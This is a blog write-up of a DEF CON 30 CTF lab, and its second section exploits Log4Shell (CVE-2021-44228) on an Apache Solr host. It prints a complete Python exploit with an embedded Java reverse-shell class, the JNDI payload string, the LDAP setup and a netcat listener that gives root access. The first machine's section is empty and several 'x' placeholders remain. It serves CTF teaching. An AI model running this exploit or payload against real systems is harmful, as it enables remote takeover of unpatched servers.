---
layout: post
title:  "Defcon 30 - Red Team Village Websploit CTF - Writeup"
date:   2022-08-20 07:00:00 +0200
tags: ["DEFCON","Web"]
---
{% assign imgDir="Defcon-30-Red-Team-Village-Websploit-CTF-Writeup" %}

<!-- Log4Shell instead of Log4j -->

# Introduction
This year, I had the opportunity to attend Blackhat and Defcon for the first time. During one of the days at Defcon, I spent most of the day in the Red Team village where I met [Omar](https://www.linkedin.com/in/santosomar/). Omar introduced me to the [Websploit CTF](https://websploit.org/defcon/) which consisted of two machines DC30_01 and DC30_02. This post is a writeup for these two machines. The first could be compromised by x and the second through log4j. The CTF could be performed either onsite or by issuing the commands x and x in a debian based host, as [documented online](https://websploit.org/index.html#features1-2y). Note that DC30_01 and DC30_02 are assigned the IP addresses 10.6.6.24 and 10.6.6.25 respectively. The next two sections contain a writeup for each of these hosts.

# DC30_01


{% highlight none linenos %}
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}

# DC30_02
We start by performing an nmap scan by executing `sudo nmap -sSCV -p- 10.10.10.5`. The `-sSCV` flag instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that the host has is running an Apache Solr web server on port 8983.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nmap -sSCV -p- 10.6.6.25@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 09:15 EDT
Nmap scan report for 10.6.6.25
Host is up (0.000019s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
@@@8983/tcp open  http    Apache Solr@@@
| http-title: @@@Solr Admin@@@
|_Requested resource was http://10.6.6.25:8983/solr/
MAC Address: 02:42:0A:06:06:19 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
{% endhighlight %}

The title of the page suggests that it is an. If we navigate to port 8983 in a browser, we are redirected to [http://10.6.6.25:8983/solr/#/](http://10.6.6.25:8983/solr/#/) which displays a dashbord for Apache Sol.

![solrVersion](/assets/{{ imgDir }}/solrVersion.png)

From the dashboard, we find that the web server is running version 8.11.0 of Apache Solr. Searching for vulnerabilities for this particular version of Apache Solr, with searchsploit, does not yield any interesting results. if we perform a Google search for Apache Solr vulnerabilities, we are pointed to [https://solr.apache.org/news.html](https://solr.apache.org/news.html) which contains a list of news and changes concerning Apache Solr. If we scroll down, we can then discove that versions prior to 8.11.1 are vulnerable to log4j.

![google](/assets/{{ imgDir }}/google.png)

<!-- TODO: Link to post with bakground on log4j? -->

![CVE](/assets/{{ imgDir }}/CVE.png)

To validate that the target is vulnerable to log4j and to discover the location of the vulnerability, we can use the log4shell scanner module in Metasploit. Log4shell is the name of the technique used to abuse log4j vulnerabilities to obtain remote code execution.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo msfconsole -q@@
msf6 > @@search log4j@@

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/log4shell_header_injection  2021-12-09       excellent  Yes    Log4Shell HTTP Header Injection
   @@@1  auxiliary/scanner/http/log4shell_scanner       2021-12-09       normal     No     Log4Shell HTTP Scanner@@@
   2  exploit/multi/http/ubiquiti_unifi_log4shell    2021-12-09       excellent  Yes    UniFi Network Application Unauthenticated JNDI Injection RCE (via Log4Shell)


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/ubiquiti_unifi_log4shell

msf6 > @@use auxiliary/scanner/http/log4shell_scanner@@
msf6 auxiliary(scanner/http/log4shell_scanner) > @@show options@@

Module options (auxiliary/scanner/http/log4shell_scanner):

   Name          Current Setting                                                                             Required  Description
   ----          ---------------                                                                             --------  -----------
   HEADERS_FILE  /opt/metasploit-framework/embedded/framework/data/exploits/CVE-2021-44228/http_headers.txt  no        File containing headers to check
   HTTP_METHOD   GET                                                                                         yes       The HTTP method to use
   LDAP_TIMEOUT  30                                                                                          yes       Time in seconds to wait to receive LDAP connections
   LDIF_FILE                                                                                                 no        Directory LDIF file path
   LEAK_PARAMS                                                                                               no        Additional parameters to leak, separated by the ^ character (e.g., ${env:USER}^${env:PATH})
   Proxies                                                                                                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         80                                                                                          yes       The target port (TCP)
   SRVHOST       0.0.0.0                                                                                     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       389                                                                                         yes       The local port to listen on.
   SSL           false                                                                                       no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /                                                                                           yes       The URI to scan
   THREADS       1                                                                                           yes       The number of concurrent threads (max one per host)
   URIS_FILE     /opt/metasploit-framework/embedded/framework/data/exploits/CVE-2021-44228/http_uris.txt     no        File containing additional URIs to check
   VHOST                                                                                                     no        HTTP server virtual host

msf6 auxiliary(scanner/http/log4shell_scanner) > 
{% endhighlight %}

We set the RHOSTS and RPORT parameters to `10.6.6.25` and `8983` respectively. In addition, we should set the SRVHOST parameter to our IP address from the perspetive of the target host. We can find this IP address using the `ip a` command.

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@ip a@@
[...]
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:46:08:dc:e2 brd ff:ff:ff:ff:ff:ff
    inet @@@172.17.0.1@@@/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
[...]
{% endhighlight %}

Once we have set the three parameters appropriately, we can launch the scanner by exeucting `run`.

{% highlight none linenos %}
msf6 auxiliary(scanner/http/log4shell_scanner) > @@set RHOSTS 10.6.6.25@@
RHOSTS => 10.6.6.25
msf6 auxiliary(scanner/http/log4shell_scanner) > @@set RPORT 8983@@
RPORT => 8983
msf6 auxiliary(scanner/http/log4shell_scanner) > @@set SRVHOST 172.17.0.1@@
SRVHOST => 172.17.0.1
msf6 auxiliary(scanner/http/log4shell_scanner) > @@run@@

[+] 10.6.6.25:8983        - @@@Log4Shell found via /solr/admin/cores?action=CREATE&wt=json&name=%24%7bjndi%3aldap%3a/172.17.0.1%3a389/jcrugbdc1jb0omq2sw0fjc6thh0yk/%24%7bjava%3aos%7d/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d (os: Linux 5.15.0-kali3-amd64 unknown, architecture: amd64-64) (java: Oracle Corporation_1.8.0_102)@@@
[*] Scanned 1 of 1 hosts (100% complete)
[*] Sleeping 30 seconds for any last LDAP connections
[*] Server stopped.
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/log4shell_scanner) >
{% endhighlight %}

The scanner identifies the vulnerability in hte `name` parameter of the `/solr/admin/cores` endpoint. The next step is to find and configure an appropriate exploit.

![findingExploitdb](/assets/{{ imgDir }}/findingExploitdb.png)

Searching for an exploit in Exploit-DB leads us to a [Python exploit](https://www.exploit-db.com/exploits/50592). A slightly modified version of the exploit is shown below. In this version, some formatting has been performed concerning line breaks and indentation. In addition, some comments have been removed for brevity.

{% highlight python linenos %}
import subprocess
import sys
import argparse
from colorama import Fore, init
import subprocess
import threading

from http.server import HTTPServer, SimpleHTTPRequestHandler

init(autoreset=True)

def listToString(s):
	str1 = ""
	try:
		for ele in s:
			str1 += ele
		return str1
	except Exception as ex:
		parser.print_help()
		sys.exit()

def payload(userip , webport , lport):

	genExploit = (
	"""
	import java.io.IOException;
	import java.io.InputStream;
	import java.io.OutputStream;
	import java.net.Socket;

	public class Exploit {

	public Exploit() throws Exception {
	String host="%s";
	int port=%s;
	String cmd="/bin/sh";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	Socket s=new Socket(host,port);
	InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
	OutputStream po=p.getOutputStream(),so=s.getOutputStream();
	while(!s.isClosed()) {
	while(pi.available()>0)
	so.write(pi.read());
	while(pe.available()>0)
	so.write(pe.read());
	while(si.available()>0)
	po.write(si.read());
	so.flush();
	po.flush();
	Thread.sleep(50);
	try {
	p.exitValue();
	break;
	}
	catch (Exception e){
	}
	};
	p.destroy();
	s.close();
	}
	}
	""") % (userip, lport)

	# writing the exploit to Exploit.java file
	try:
		f = open("Exploit.java", "w")
		f.write(genExploit)
		f.close()
		print(Fore.GREEN + '[+] Exploit java class created success')

	except Exception as e:
		print(Fore.RED + f'[-] Something went wrong {e.toString()}')

	checkJavaAvailible()
	print(Fore.GREEN + '[+] Setting up fake LDAP server\n')

	# create the LDAP server on new thread
	t1 = threading.Thread(target=createLdapServer, args=(userip,webport))
	t1.start()

	# start the web server
	httpd = HTTPServer(('localhost', int(webport)), SimpleHTTPRequestHandler)
	httpd.serve_forever()

def checkJavaAvailible():
	javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
	if(javaver != 0):
		print(Fore.RED + '[-] Java is not installed inside the repository ')
		sys.exit()

def createLdapServer(userip, lport):
	sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
	print(Fore.GREEN +"[+] Send me: "+sendme+"\n")

	subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])

	url = "http://{}:{}/#Exploit".format(userip, lport)
	subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
	"target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])

def header():
	print(Fore.BLUE+"""
	[!] CVE: CVE-2021-44228
	[!] Github repo:
	https://github.com/kozmer/log4j-shell-poc
	""")

if __name__ == "__main__":
	header()

	try:
		parser = argparse.ArgumentParser(description='please enter the values ')

		parser.add_argument('--userip', metavar='userip', type=str,
		nargs='+', help='Enter IP for LDAPRefServer & Shell')

		parser.add_argument('--webport', metavar='webport', type=str,
		nargs='+', help='listener port for HTTP port')

		parser.add_argument('--lport', metavar='lport', type=str,
		nargs='+', help='Netcat Port')

		args = parser.parse_args()

		payload(listToString(args.userip), listToString(args.webport), listToString(args.lport))

	except KeyboardInterrupt:
		print(Fore.RED + "user interupted the program.")
		sys.exit(0)

{% endhighlight %}

There are three things we need to fix before this exploit can be used. The first is that its web server listens on localhost. we can fix this by patching the line `httpd = HTTPServer(('localhost', int(webport)), SimpleHTTPRequestHandler)` in the `payload` function to `httpd = HTTPServer((userip, int(webport)), SimpleHTTPRequestHandler)`. The second is that the exploit requires Java 8 to be present in the current working directory. As can be seen in the functions `checkJavaAvailible` and `createLdapServer`. 

{% highlight none linenos %}
def checkJavaAvailible():
        javaver = subprocess.call(['@@@./jdk1.8.0_20/bin/java@@@', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        if(javaver != 0):
                print(Fore.RED + '[-] Java is not installed inside the repository ')
                sys.exit()

def createLdapServer(userip, lport):
        sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
        print(Fore.GREEN +"[+] Send me: "+sendme+"\n")

        subprocess.run(["@@@./jdk1.8.0_20/bin/javac@@@", "Exploit.java"])

        url = "http://{}:{}/#Exploit".format(userip, lport)
        subprocess.run(["@@@./jdk1.8.0_20/bin/java@@@", "-cp",
        "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
{% endhighlight %}

To make Java 8 available to the exploit, we first create an account at [https://www.oracle.com](https://www.oracle.com) and then navigate to [https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html). Then we download Java 8 by clicking the `jdk-8u202-linux-x64.tar.gz` link. Note that there is no link for `jdk-8u20`. However, `jdk-8u202` is close enough.

![java8](/assets/{{ imgDir }}/java8.png)

Once downloaded, we can uncompress the `tar.gz` file and ensure that the resulting folder is placed in the same directory as the exploit and named appropriately.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@mv ~/Downloads/jdk-8u202-linux-x64.tar.gz .@@                                         
  
┌──(kali㉿kali)-[/tmp/x]
└─$ @@tar -xzf jdk-8u202-linux-x64.tar.gz@@

┌──(kali㉿kali)-[/tmp/x]
└─$ @@mv jdk1.8.0_202 jdk1.8.0_20@@

┌──(kali㉿kali)-[/tmp/x]
└─$ @@ls@@
@@@exploit.py@@@  jdk1.8.0_20  jdk-8u202-linux-x64.tar.gz
{% endhighlight %}

The last thing we need to fix is that the exploit requires the jar file x as can be seen in the function x. Judging by the name, this jar originates from the marshalsec project which is available on [GitHub](https://github.com/mbechler/marshalsec). According to the `readme.txt` file of the repository, the project can be compiled with maven by executing `mvn clean package -DskipTests`. This results in the jar file we need! Once the jar file has been built, we move the `target` directory to the directory containing the exploit, to ensure that the exploit can find it.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@git clone https://github.com/mbechler/marshalsec.git@@
Cloning into 'marshalsec'...
remote: Enumerating objects: 168, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 168 (delta 33), reused 28 (delta 28), pack-reused 128
Receiving objects: 100% (168/168), 470.61 KiB | 1.59 MiB/s, done.
Resolving deltas: 100% (89/89), done.
                           
┌──(kali㉿kali)-[/tmp/x]
└─$ @@cd marshalsec@@

┌──(kali㉿kali)-[/tmp/x/marshalsec]
└─$ @@mvn clean package -DskipTests@@
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[INFO] Scanning for projects...
[...]
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  22.433 s
[INFO] Finished at: 2022-08-18T12:42:09-04:00
[INFO] ------------------------------------------------------------------------

┌──(kali㉿kali)-[/tmp/x]
└─$ @@ls ./target@@
archive-tmp  generated-sources       marshalsec-0.0.3-SNAPSHOT-all.jar  maven-archiver  test-classes
classes      generated-test-sources  @@@marshalsec-0.0.3-SNAPSHOT.jar@@@      maven-status

┌──(kali㉿kali)-[/tmp/x/marshalsec]
└─$ @@mv target ..@@                               

┌──(kali㉿kali)-[/tmp/x/marshalsec]
└─$ @@cd ..@@
                       
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ls@@
exploit.py  jdk1.8.0_20  jdk-8u202-linux-x64.tar.gz  marshalsec  @@@target@@@
{% endhighlight %}

At this point, we have everything we need to launch the exploit. The exploit takes three arguments,as can be seen below.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ python exploit.py -h                                           

        [!] CVE: CVE-2021-44228
        [!] Github repo:
        https://github.com/kozmer/log4j-shell-poc

usage: exploit.py [-h] [--userip userip [userip ...]] [--webport webport [webport ...]] [--lport lport [lport ...]]

please enter the values

options:
  -h, --help            show this help message and exit
  --userip userip [userip ...]
                        Enter IP for LDAPRefServer & Shell
  --webport webport [webport ...]
                        listener port for HTTP port
  --lport lport [lport ...]
                        Netcat Port

┌──(kali㉿kali)-[/tmp/x]
└─$ @@python exploit.py --userip 172.17.0.1 --webport 8000 --lport 443@@

        [!] CVE: CVE-2021-44228           
        [!] Github repo:
        https://github.com/kozmer/log4j-shell-poc          
                             
[+] Exploit java class created success
[+] Setting up fake LDAP server
                                                                                                                                                            
[+] @@@Send me: ${jndi:ldap://172.17.0.1:1389/a}@@@

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
{% endhighlight %}

If we execute the exploit with appropriate parameter values, it starts an LDAP and a web server. In addition, it provides us with the payload string `${jndi:ldap://172.17.0.1:1389/a}`. Sending this payload through the vulnerable parameter should trick the Log4j framework into making a request to the LDAP server which then causes a web request to the web server which, in turn, returns a reverse shell payload. Once the target executes the reverse shell payload, it will try to connect back to us on port `443` which we defined earlier using the `lport` flag. As such, we need to execute `sudo nc -lvp 443` to start a listener on this port before sending the payload to the target.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nc -lvnp 443@@
listening on [any] 443 ...
{% endhighlight %}

![executingPayload](/assets/{{ imgDir }}/executingPayload.png)

{% highlight none linenos %}
Listening on 0.0.0.0:1389
@@@Send LDAP reference result for a redirecting to http://172.17.0.1:8000/Exploit.class
10.6.6.25 - - [18/Aug/2022 13:51:14] "GET /Exploit.class HTTP/1.1" 200 -@@@
{% endhighlight %}

Browsing to `/solr/admin/cores?action=CREATE&wt=json&name=${jndi:ldap://172.17.0.1:1389/a}` results in an error message. However, according to the output of the exploit, the target host sent us an LDAP request and a web request. This suggests that our payload was executed!

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nc -lvnp 443@@
listening on [any] 443 ...
@@@connect to [172.17.0.1] from (UNKNOWN) [10.6.6.25] 37856@@@
@@whoami@@
@@@root@@@
{% endhighlight %}

Indeed, if we check the netcat listener, we notice that we have received a shell on the target as the `root` user!
